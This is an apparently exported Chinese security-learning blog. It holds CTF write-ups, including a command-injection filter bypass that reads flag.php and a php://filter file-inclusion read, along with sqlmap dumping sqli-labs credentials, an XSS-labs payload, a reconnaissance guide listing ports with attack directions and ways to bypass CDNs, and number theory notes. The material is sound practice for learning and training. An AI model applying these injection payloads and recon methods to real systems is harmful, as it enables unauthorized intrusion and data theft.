<h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>打开链接啥也没有，源码中啥也没有，扫了下目录，发现有个index,下载下来里面就有flag,感觉是非预期，这应该是出题人疏忽了吧，也没用到题目中所说的命令执行，index文件内容如下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd0.jpg" alt=""><br>最后题目修复了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd1.jpg" alt=""><br>扫一下目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=1;ls</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd2.jpg" alt=""><br>题目过滤了许多关键词，需要绕过来读取flag.php<br>od命令：<a href="https://www.cnblogs.com/cxgg/p/9165062.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxgg/p/9165062.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;od<span class="variable">$IFS</span><span class="variable">$1</span>-tc<span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure>
<p>或者用ca$@t来替换cat命令也可以读取flag.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;ca<span class="variable">$@t</span><span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure>
<p>然后在源码中会发现flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd3.jpg" alt=""></p>
<h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include0.jpg" alt=""><br>随便写点提交<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include1.jpg" alt=""><br>看见thankyou.php,盲猜flag.php,直接伪协议读取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include2.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHANCg0KLy9mbGFnPXdodWN0ZntOMHdfeTB1X2tuMHdfZmlsZV9pbmNsdXNpb259DQoNCg==</span><br></pre></td></tr></table></figure>
<p>base64解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag=whuctf&#123;N0w_y0u_kn0w_file_inclusion&#125;</span><br></pre></td></tr></table></figure>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h3><h4 id="智能合约-那是啥"><a href="#智能合约-那是啥" class="headerlink" title="智能合约? 那是啥"></a>智能合约? 那是啥</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x202E653dA93c2a06076FC95B0A07E39B6003C5f6 Ropsten</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * The CoinFlip contract does nothing...</span><br><span class="line"> */</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">	uint256 lashHash;</span><br><span class="line">	uint256 Factor = 20244007718664171871063861089;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line">    string flag;</span><br><span class="line"></span><br><span class="line">	constructor (string _flag) public &#123;</span><br><span class="line">		flag = _flag;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> getBalance () public returns(uint) &#123;</span><br><span class="line">		<span class="built_in">return</span> balances[tx.origin];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">		uint256 blockValue = uint256(block.blockhash(block.number - 1));</span><br><span class="line">		lashHash = blockValue;</span><br><span class="line">		uint256 ans = blockValue / Factor;</span><br><span class="line">		bool side = ans == 1 ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">			balances[tx.origin]++;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			balances[tx.origin] = 0;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> GetTheFlag() public view returns (string)&#123;</span><br><span class="line">		<span class="built_in">return</span> flag;  // You can get your flag here</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译一下，点击GetTheFlag就会输出flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Smart_contract/WHUCTF_1/1.jpg" alt=""></p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="佛系青年BingGe"><a href="#佛系青年BingGe" class="headerlink" title="佛系青年BingGe"></a>佛系青年BingGe</h4><p>我看见我的朋友BingGe坐在信部网球场的栅栏边上看一本佛经，我很好奇，也过去看，只见上面写着: 佛曰：般羅穆僧冥神大侄所隸奢尼哆恐侄大藐若故曳咒室呐阿竟諳他缽悉爍諦哆咒豆苦缽尼帝所冥等上哆瑟俱薩諸諳伊冥特諳實怯他罰不參亦皤有婆僧藝俱羯怯至皤滅知真哆訶亦能怯瑟梵陀奢知呼故梵夢死有皤能薩曰俱穆勝竟怯明奢參世缽佛皤羯瑟奢孕梵逝楞呐醯故奢想謹提諦盡侄阿哆利俱吉罰老謹涅神能皤集實輸奢薩奢數哆波者俱勝俱所遠盡呐倒利闍盧諦罰薩梵曰度提大諦哆穆輸醯怯參侄諸娑梵伽知勝穆伊顛冥參道冥有<br>第一步与佛论禅解密</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">767566536773bf1ef643676363676784e1d015847635575637560ff4f41d</span><br></pre></td></tr></table></figure>
<p>尝试转ASCII，转换失败，题目中说到栅栏，栅栏解密，当为6栏时</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7768756374667b6e305f315f616d5f6e30745f615f36756464683173747d</span><br></pre></td></tr></table></figure>
<p>转ASCII成功whuctf{n0_1_am_n0t_a_6uddh1st}</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Bivibivi"><a href="#Bivibivi" class="headerlink" title="Bivibivi"></a>Bivibivi</h4><p>Do you know B-site?<br>nc 218.197.154.9 16387<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc0.jpg" alt=""><br>第一步就直接模逆运算，然后就没啥了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc2.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Windows系统中安装WAMP</title>
    <url>/2020/01/20/Windows%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%AE%89%E8%A3%85WAMP/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Web安全攻防-渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>Sqli-labs</title>
    <url>/2020/03/02/Sqli-labs/</url>
    <content><![CDATA[<p>Sqlmap(kali linux)初步使用+手工注</p>
<a id="more"></a>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><img src="http://q63cs67co.bkt.clouddn.com/less1_1.PNG" alt=""><br>加单引号测试<br><img src="http://q63cs67co.bkt.clouddn.com/less1_2.PNG" alt=""><br>报错了，说明这里有注入点，上Sqlmap<br>爆数据库名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/less1_3.PNG" alt=""><br>爆出数据库名，在security数据库中，接下来根据数据库名爆表名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security --tables</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/less1_4.PNG" alt=""><br>爆出表名users,根据表名爆出字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users --columns</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/less1_5.PNG" alt=""><br>爆出字段名后，即可爆出字段值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://f0ea4202-4b3b-4ac1-8746-09cb20417283.node3.buuoj.cn/Less-1/?id=1"</span> -D security -T users -C <span class="string">"id,password,username"</span> --dump</span><br></pre></td></tr></table></figure>
<p><img src="http://q63cs67co.bkt.clouddn.com/less1_6.PNG" alt=""></p>
<h3 id="手工注"><a href="#手工注" class="headerlink" title="手工注"></a>手工注</h3><p><img src="http://q63cs67co.bkt.clouddn.com/less1_8.jpg" alt=""><br>没有问题<br><img src="http://q63cs67co.bkt.clouddn.com/less1_7.jpg" alt=""><br>报错，说明是单引号注入</p>
<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2>]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Xss-labs</title>
    <url>/2019/12/26/Xss-labs/</url>
    <content><![CDATA[<p>题目链接：<a href="http://web-labs.rinue.top/xss-labs/" target="_blank" rel="noopener">http://web-labs.rinue.top/xss-labs/</a></p>
<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>在控制台输入alert(“xss”),回车通关</p>
<a id="more"></a>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>一个输入框<br>查看源代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和123456相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=<span class="string">"123456"</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=submit name=submit value=<span class="string">"搜索"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>123456就是在输入框所输入的值，那么只需要闭合<input name=keyword  value="123456">中123456前面的语句即可，”&gt;<script>alert(123456)</script></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2020/01/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>kali下的whois查询<br><img src="http://q63cs67co.bkt.clouddn.com/whois.jpg" alt=""><br>爱站工具网：<a href="https://whois.aizhan.com" target="_blank" rel="noopener">https://whois.aizhan.com</a><br>站长之家：<a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a><br>VirusTotal：<a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a></p>
<a id="more"></a>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>ICP备案信息查询网：<a href="http://www.beianbeian.com" target="_blank" rel="noopener">http://www.beianbeian.com</a><br>天眼查：<a href="http://www.tianyancha.com" target="_blank" rel="noopener">http://www.tianyancha.com</a></p>
<h2 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h2><h3 id="搜索引擎-google-关键字语法搜索"><a href="#搜索引擎-google-关键字语法搜索" class="headerlink" title="搜索引擎(google)关键字语法搜索"></a>搜索引擎(google)关键字语法搜索</h3><h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><p>利用Burpsuite的Repeater获取对象服务器信息，如运行的Server类型及版本，PHP版本信息。针对不同的Server，可以利用不同的漏洞进行测试</p>
<h2 id="收集子域名信息"><a href="#收集子域名信息" class="headerlink" title="收集子域名信息"></a>收集子域名信息</h2><h3 id="子域名检测工具"><a href="#子域名检测工具" class="headerlink" title="子域名检测工具"></a>子域名检测工具</h3><p>Layer子域名挖掘机:<a href="https://www.uedbox.com/post/8998/" target="_blank" rel="noopener">https://www.uedbox.com/post/8998/</a><br>Sublist3r,subDomainsBrute</p>
<h3 id="搜索引擎枚举"><a href="#搜索引擎枚举" class="headerlink" title="搜索引擎枚举"></a>搜索引擎枚举</h3><p>例如要搜索百度旗下的子域名：site:baidu.com</p>
<h3 id="第三方聚合应用枚举"><a href="#第三方聚合应用枚举" class="headerlink" title="第三方聚合应用枚举"></a>第三方聚合应用枚举</h3><p>DNSSdumpster网站：<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p>
<h3 id="证书透明度公开日志枚举"><a href="#证书透明度公开日志枚举" class="headerlink" title="证书透明度公开日志枚举"></a>证书透明度公开日志枚举</h3><p>crt.sh:<a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a><br>censys:<a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a><br>子域名爆破网站:<a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a><br>IP反查绑定域名网站:<a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a></p>
<h2 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h2><p>扫描工具：Nmap<br>无状态端口扫描工具：Masscan,ZMap<br>御剑高速TCP端口扫描工具</p>
<h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">21/22/69            Ftp/Tftp文件传输协议      允许匿名的上传、下载、爆破和嗅探操作</span><br><span class="line">2049                    Nfs服务                     配置不当</span><br><span class="line">139                     Samba服务            爆破、未授权访问、远程代码执行</span><br><span class="line">389                 Ldap目录访问协议           注入、允许匿名访问、弱口令</span><br></pre></td></tr></table></figure>
<h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line"> 22                   SSH远程连接            爆破、 SSH隧道及内网代理转发、文件传输</span><br><span class="line"> 23                   Telnet远程连接             爆破、嗅探、弱口令</span><br><span class="line"> 3389                 Rdp远程桌面连接        Shift后门(需要Windows Server 2003以下的系统)、爆破</span><br><span class="line"> 5900                    VNC                       弱口令爆破 </span><br><span class="line"> 5632                PyAnywhere服务               抓密码、代码执行</span><br></pre></td></tr></table></figure>
<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a>Web应用服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">80/443/8080         常见的Web服务端口       Web攻击、爆破、对应服务器版本漏洞</span><br><span class="line">7001/7002           WebLogin控制台          Java反序列化、弱口令</span><br><span class="line">8080/8089     JBoss/Resin/Jetty/Jenkins     反序列化、控制台弱口令</span><br><span class="line">9090                WebSphere控制台         Java反序列化、弱口令</span><br><span class="line">4848                GlassFish控制台                 弱口令</span><br><span class="line">1352              Lotus domino邮件服务      弱口令、信息泄露、爆破</span><br><span class="line">10000             Webmin-Web控制面板                弱口令</span><br></pre></td></tr></table></figure>
<h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">3306                    MySQL                   注入、提权、爆破</span><br><span class="line">1433                  MSSQL数据库               注入、提权、SA弱口令、爆破</span><br><span class="line">1521                  Oracle数据库              TNS爆破、注入、反弹Shell</span><br><span class="line">5432                  PostgreSQL数据库          爆破、注入、弱口令</span><br><span class="line">27017/27018            MongoDB                  爆破、未授权访问</span><br><span class="line">6379                   Redis数据库              可尝试未授权访问、弱口令爆破</span><br><span class="line">5000                 SysBase/DB2数据库              爆破、注入</span><br></pre></td></tr></table></figure>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">25                    SMTP邮件服务                  邮件伪造</span><br><span class="line">110                    POP3协议                    爆破、嗅探</span><br><span class="line">143                    IMAP协议                      爆破</span><br></pre></td></tr></table></figure>
<h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">53                     DNS域名系统          允许区域传送、DNS劫持、缓存投毒、欺骗</span><br><span class="line">67/68                  DHCP服务                    劫持、欺骗</span><br><span class="line">161                    SNMP协议                  爆破、搜集目标内网信息</span><br></pre></td></tr></table></figure>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">端口号                  端口说明                    攻击方向</span><br><span class="line">2181                  Zookeeper服务                未授权访问</span><br><span class="line">8069                  Zabbix服务                远程执行、SQL注入</span><br><span class="line">9200/9300            Elastissearch服务             远程执行</span><br><span class="line">11211                Memcache服务                  未授权访问</span><br><span class="line">512/513/514         Linux Rexec服务              爆破、Rlogin登陆</span><br><span class="line">873                    Rsync服务                 匿名访问、文件上传</span><br><span class="line">3690                   Svn服务                  Svn泄露、未授权访问</span><br><span class="line">50000              SAP Management Console          远程执行</span><br></pre></td></tr></table></figure>
<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>CMS扫描工具：Web指纹识别、WhatWeb、WhatRobo、椰树、轻量WEB指纹识别<br>BugScaner:<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br>云悉指纹:<a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a><br>和WhatWeb:<a href="https://whatweb.net/" target="_blank" rel="noopener">https://whatweb.net/</a></p>
<h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><h3 id="目标服务器存在CDN"><a href="#目标服务器存在CDN" class="headerlink" title="目标服务器存在CDN"></a>目标服务器存在CDN</h3><p>CDN：内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。<br>即是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户最近的节点服务器上响应给用户。<br>渗透目标购买了CDN服务，直接ping目标的域名，得到的不是真正的目标Web服务器，只是最近一台目标节点的CDN服务器，所以无法直接得到目标的真实IP段范围</p>
<h3 id="判断目标是否用了CDN"><a href="#判断目标是否用了CDN" class="headerlink" title="判断目标是否用了CDN"></a>判断目标是否用了CDN</h3><p>①ping目标主域，观察域名解析情况<br>②在线网站：<a href="https://www.17ce.com" target="_blank" rel="noopener">https://www.17ce.com</a> ，对全国多地区的ping服务器操作，对比每个地区ping出的IP结果，查看IP是否一致，若一致则可能不存在CDN</p>
<h3 id="绕过CDN寻找真实IP"><a href="#绕过CDN寻找真实IP" class="headerlink" title="绕过CDN寻找真实IP"></a>绕过CDN寻找真实IP</h3><p>当目标使用了CDN时，就需要绕过CDN寻找目标的真实IP<br>①内部邮箱源：一般内部的邮箱系统没有经过CDN解析，ping这个邮箱服务器的域名，就可以查找到目标的真实IP<br>②扫描网站测试文件：phpinfo和test<br>③分站域名：由于主站访问量大，都会挂CDN，但是分站可能没有挂CDN，可通过ping二级域名获取分站IP<br>④国外访问：国内的CDN只对国内用户的访问加速，而国外的CDN就不一定了。通过国外在线代理网站App Synthetic Monitor:<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a> 访问，可能会得到真实IP<br>⑤查询域名解析记录：也许目标以前没有用过CDN，可通过网站NETCRAFT:<a href="https://www.netcraft.com" target="_blank" rel="noopener">https://www.netcraft.com</a> 观察域名的IP历史记录，可以大致分析出目标的真实IP段<br>⑥若目标网站有自己的App,可以尝试利用Fiddler和Burpsuite抓取App的请求，找到真实IP<br>⑦绕过CloudFlare CDN查找真实IP：许多网站都使用CloudFlare提供的CDN服务，如果目标网站使用了CDN，则可尝试通过在线网站CloudFlareWatch:<a href="http://www.crimeflare.us/cfs.html#box" target="_blank" rel="noopener">http://www.crimeflare.us/cfs.html#box</a> 查询真实IP</p>
<h2 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h2><p>探测Web目录结构和隐藏的敏感文件，获取网站的后台管理界面、文件上传界面、甚至可能扫描出网站的源代码<br>网站目录扫描工具：DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py、Sensitivefilescan、weakfilescan<br>WebScan：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></p>
]]></content>
      <categories>
        <category>Web安全攻防-渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>信息安全数学基础</title>
    <url>/2019/12/29/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="一次同余式求解"><a href="#一次同余式求解" class="headerlink" title="一次同余式求解"></a>一次同余式求解</h2><a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"ax ≡ b (mod m )"</span>)</span><br><span class="line">a=<span class="built_in">eval</span>(input(<span class="string">"请输入a:"</span>))</span><br><span class="line">b=<span class="built_in">eval</span>(input(<span class="string">"请输入b:"</span>))</span><br><span class="line">m=<span class="built_in">eval</span>(input(<span class="string">"请输入m:"</span>))</span><br><span class="line"><span class="comment"># 判断同余式是否有解(a,m)=1</span></span><br><span class="line">a1,b1=a,m</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    s=a1%b1  </span><br><span class="line">    <span class="keyword">if</span> s==0:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    a1=b1     </span><br><span class="line">    b1=s</span><br><span class="line"><span class="comment">#求出ax ≡ 1 (mod m )特解 x' = SpecialAnswer (mod m )</span></span><br><span class="line"><span class="keyword">if</span>(b1==1):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,m):</span><br><span class="line">        <span class="keyword">if</span>((a*i)%m==1):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"特解为x' ≡ &#123;&#125; (mod &#123;&#125; )"</span>.format(i,m))</span><br><span class="line">            SpecialAnswer=i</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    AllAnswer=(b*i)%m</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"同余式的所有解为x ≡ &#123;&#125;(mod &#123;&#125; )"</span>.format(AllAnswer,m))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"同余式没有解！"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="普通解法"><a href="#普通解法" class="headerlink" title="普通解法"></a>普通解法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127 x ≡ 833 (mod 1012)</span><br><span class="line">①判断是否有解</span><br><span class="line">(127,1012)=1,则(127,1012)|833,则有解</span><br><span class="line">②求同余式127 x ≡ 1 (mod 1012)的特解(遍历1012的剩余系)</span><br><span class="line">x0<span class="string">'=255(mod 1012)</span></span><br><span class="line"><span class="string">③求原同余式的特解</span></span><br><span class="line"><span class="string">x0=833*x0'</span>≡907 (mod 1012)</span><br><span class="line">所有解：x≡907 (mod 1012)</span><br></pre></td></tr></table></figure>
<h3 id="Euler定理解法"><a href="#Euler定理解法" class="headerlink" title="Euler定理解法"></a>Euler定理解法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">5  x≡ 3 (mod 14)</span><br><span class="line">判断是否满足Eluer定理：(5,14)=1,满足</span><br><span class="line">由Euler定理可得：5^ψ(14)≡1 (mod 14)</span><br><span class="line">则构造出了解：5*(5^(ψ(14)-1))*3≡ 3 (mod 14)</span><br><span class="line">则x=(5^(ψ(14)-1))*3≡9 (mod 14)</span><br></pre></td></tr></table></figure>
<h3 id="转换为同余式方程组解法-中国剩余定理"><a href="#转换为同余式方程组解法-中国剩余定理" class="headerlink" title="转换为同余式方程组解法(中国剩余定理)"></a>转换为同余式方程组解法(中国剩余定理)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">17 x ≡229 (mod 1540)</span><br><span class="line">分解1540=4*5*7*11</span><br><span class="line">原同余式方程可化为同余式方程组</span><br><span class="line">17 x ≡1 (mod 4)              x ≡1 (mod 4)     </span><br><span class="line">17 x ≡4 (mod 5)       ==&gt;    x ≡2 (mod 5)</span><br><span class="line">17 x ≡5 (mod 7)              x ≡4 (mod 7)</span><br><span class="line">17 x ≡9 (mod 11)             x ≡7 (mod 11)</span><br><span class="line">注：其中17 x ≡1 (mod 4)中的 1 是由229 mod 4得到的</span><br><span class="line">m1=1        m2=2        m3=4        m4=7</span><br><span class="line">M1=m2*m3*m4         M2=m1*m3*m4         M3=m1*m2*m4         M4=m1*m2*m3</span><br><span class="line">M1<span class="string">'*M1 ≡1 (mod m1)  ==&gt;  M1'</span>=1</span><br><span class="line">M2<span class="string">'*M2 ≡1 (mod m2)  ==&gt;  M2'</span>=2</span><br><span class="line">M3<span class="string">'*M3 ≡1 (MOD m3)  ==&gt;  M3'</span>=5</span><br><span class="line">M4<span class="string">'*M4 ≡1 (MOD m4)  ==&gt;  M4'</span>=7</span><br><span class="line">该同余式方程的解 x = b1*M1<span class="string">'*M1 + b2*M2'</span>*M2 + b3*M3<span class="string">'*M3 + b4*M4'</span>*M4 ≡557 (MOD 1540)</span><br></pre></td></tr></table></figure>
<h2 id="最大公因数和最小公倍数"><a href="#最大公因数和最小公倍数" class="headerlink" title="最大公因数和最小公倍数"></a>最大公因数和最小公倍数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"first integer &gt; second integer"</span>)</span><br><span class="line">str1=input(<span class="string">"input the first integer:"</span>)</span><br><span class="line">str2=input(<span class="string">"input the second integer:"</span>)</span><br><span class="line">x=int(str1) <span class="comment">#169</span></span><br><span class="line">y=int(str2) <span class="comment">#121</span></span><br><span class="line">a,b=x,y</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    s=x%y   <span class="comment">#48,25,23,2,1,0</span></span><br><span class="line">    <span class="keyword">if</span> s==0:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    x=y     <span class="comment">#121,48,25,23,2</span></span><br><span class="line">    y=s     <span class="comment">#48,25,23,2,1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"最大公因数是:"</span>,y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"最小公倍数是：&#123;:.0f&#125;"</span>.format((a*b)/y))</span><br></pre></td></tr></table></figure>
<h2 id="二次同余式与平方剩余"><a href="#二次同余式与平方剩余" class="headerlink" title="二次同余式与平方剩余"></a>二次同余式与平方剩余</h2><h3 id="求平方剩余-二次剩余"><a href="#求平方剩余-二次剩余" class="headerlink" title="求平方剩余(二次剩余)"></a>求平方剩余(二次剩余)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x^2 ≡ a (mod m),其中m是正整数，且(a,m)=1</span><br><span class="line">如果该同余式有解，则a就是模m的平方剩余，否则是平方非剩余(二次非剩余)</span><br><span class="line">求模 7 的平方剩余</span><br><span class="line">即满足x^2 ≡ a (mod 7)有解的a,x∈（7的剩余系）</span><br><span class="line">a           x</span><br><span class="line">1           1,6</span><br><span class="line">2           3,4</span><br><span class="line">3           无解</span><br><span class="line">4           2,5</span><br><span class="line">5           无解</span><br><span class="line">6           无解</span><br><span class="line">所以模7的平方剩余为1,2,4,平方非剩余为3,5,6</span><br></pre></td></tr></table></figure>
